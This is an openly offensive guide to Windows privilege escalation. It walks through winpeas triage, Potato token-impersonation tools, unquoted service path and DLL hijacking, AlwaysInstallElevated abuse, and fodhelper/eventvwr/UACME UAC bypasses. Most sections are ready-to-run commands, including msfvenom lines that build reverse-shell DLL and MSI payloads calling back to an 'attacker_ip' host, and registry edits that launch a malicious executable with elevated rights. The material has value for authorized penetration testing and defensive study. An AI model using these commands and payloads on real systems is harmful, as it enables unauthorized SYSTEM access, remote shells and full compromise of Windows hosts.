# Windows Privilege Escalation Attack Guide

## Introduction

Windows privilege escalation transforms a standard user shell into SYSTEM or Administrator access by exploiting token privileges, service misconfigurations, registry weaknesses, and UAC bypass techniques. Unlike Linux where SUID binaries and sudo rules dominate, Windows escalation centers on token impersonation (SeImpersonatePrivilege), service path vulnerabilities, DLL hijacking, and Windows-specific registry keys that enable auto-elevation. This guide covers interpreting winpeas output, executing token impersonation attacks, exploiting unquoted service paths, performing DLL hijacking, leveraging AlwaysInstallElevated, and bypassing User Account Control.

---

## 1. Analyzing winpeas Output

winpeas categorizes findings with color-coded severity indicators similar to linpeas:

- **RED**: Critical findings — SeImpersonatePrivilege enabled, AlwaysInstallElevated set, writable service binaries, unquoted service paths with writable directories.
- **YELLOW**: Moderate findings — stored credentials, AutoRun programs, weak service permissions, DLL hijacking opportunities.
- **GREEN**: Informational — system info, patch level, network configuration.

```powershell
# Run winpeas with fast mode for quick results
.\winPEAS.exe quiet cmd fast

# Run specific enumeration modules
.\winPEAS.exe servicesinfo      # Service misconfigurations
.\winPEAS.exe credentials       # Stored credentials and tokens
.\winPEAS.exe systeminfo        # Patch level and version
```

Priority actions based on common winpeas findings:

| winpeas Finding | Meaning | Exploitation |
|-----------------|---------|-------------|
| `SeImpersonatePrivilege` | Service account with token impersonation | Potato attack (JuicyPotato, PrintSpoofer, GodPotato) |
| `AlwaysInstallElevated = 1` | MSI packages install as SYSTEM | Create malicious MSI with msfvenom |
| `Unquoted Service Path` | Service path without quotes and spaces | Place malicious binary in intercepted path |
| `Writable service binary` | Service executable is modifiable | Replace with malicious binary and restart service |
| `Stored credentials` | Credentials saved in Windows Credential Manager | Use `runas /savecred` to execute as stored user |

---

## 2. Token Impersonation (Potato Attacks)

SeImpersonatePrivilege is the most powerful Windows escalation primitive. It is commonly assigned to service accounts (IIS AppPool, SQL Server, MMSQL) and allows impersonating any token the process can obtain:

```powershell
# Verify the privilege
whoami /priv
# Look for: SeImpersonatePrivilege

# Windows 7/8/Server 2008/2012: JuicyPotato
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

# Windows 10/Server 2016/2019: PrintSpoofer
PrintSpoofer.exe -i -c cmd

# Universal: GodPotato (works across most versions)
GodPotato.exe -cmd "cmd /c whoami"
```

The choice of tool depends on the Windows version. JuicyPotato exploits DCOM/NTLM relay and requires a valid CLSID. PrintSpoofer abuses the printing service named pipe impersonation. GodPotato combines multiple techniques for broader compatibility.

---

## 3. Unquoted Service Path Exploitation

When a Windows service path contains spaces and is unquoted, the service control manager tries to resolve the path by testing each space-delimited segment:

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Example vulnerable path: C:\Program Files\Vulnerable Service\service.exe
# Windows tries: C:\Program.exe, then C:\Program Files\Vulnerable.exe

# Check write permissions on candidate directories
accesschk.exe /accepteula -uwcqv "Authenticated Users" C:\
accesschk.exe /accepteula -uwcqv "Authenticated Users" "C:\Program Files"

# Place malicious binary at the intercepted path
copy malicious.exe "C:\Program.exe"

# Restart the service or wait for system reboot
sc stop "VulnerableService"
sc start "VulnerableService"
```

---

## 4. DLL Hijacking

Windows DLL search order loads DLLs from the application directory before system directories. If a service loads a DLL by name without a full path, placing a malicious DLL in the service directory results in code execution as the service account:

```powershell
# Identify DLLs loaded by a service using Process Monitor (Sysinternals)
# Filter: Process Name is <service.exe>, Result is NAME NOT FOUND

# Common hijackable DLLs: version.dll, dbghelp.dll, cryptbase.dll, uxtheme.dll

# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f dll -o version.dll

# Place in service directory (before system32 in search order)
copy version.dll "C:\Program Files\Vulnerable Service\"

# Restart service to load malicious DLL
sc stop "ServiceName"
sc start "ServiceName"
```

For production-safe testing, create a DLL that forwards original function calls and only executes the payload, avoiding service crash.

---

## 5. AlwaysInstallElevated

When both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1, any MSI package executed by any user runs with elevated (SYSTEM) privileges:

```powershell
# Check both registry keys (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If confirmed, generate and execute malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi
```

This is a configuration error often found in enterprise environments where administrators want software installation without UAC prompts.

---

## 6. UAC Bypass Techniques

User Account Control (UAC) at default settings allows certain built-in Windows binaries to auto-elevate without prompting. Exploiting these trusted binaries bypasses the consent prompt:

```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# fodhelper.exe bypass (Windows 10/11)
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
fodhelper.exe
# Cleanup:
reg delete "HKCU\Software\Classes\ms-settings" /f

# eventvwr.exe bypass (Windows 7/10)
reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "C:\Temp\malicious.exe" /f
eventvwr.exe

# UACME (comprehensive bypass collection, 60+ methods)
Akagi64.exe <method_number> C:\Temp\malicious.exe
```

UAC bypass is only effective when UAC is not set to "Always Notify" (level 4). At levels 1-3, auto-elevation of trusted binaries can be exploited.

---

## References

- LOLBAS Project -- https://lolbas-project.github.io
- HackTricks Windows Privilege Escalation -- https://book.hacktricks.windows-hardening/windows-privilege-escalation
- winpeas Repository -- https://github.com/carlospolop/PEASS-ng
- UACME Project -- https://github.com/hfiref0x/UACME
- JuicyPotato -- https://github.com/ohpe/juicy-potato
- PrintSpoofer -- https://github.com/itm4n/PrintSpoofer
- GodPotato -- https://github.com/BeichenDream/GodPotato
- MITRE ATT&CK T1548 -- https://attack.mitre.org/techniques/T1548/
- MITRE ATT&CK T1134 -- https://attack.mitre.org/techniques/T1134/
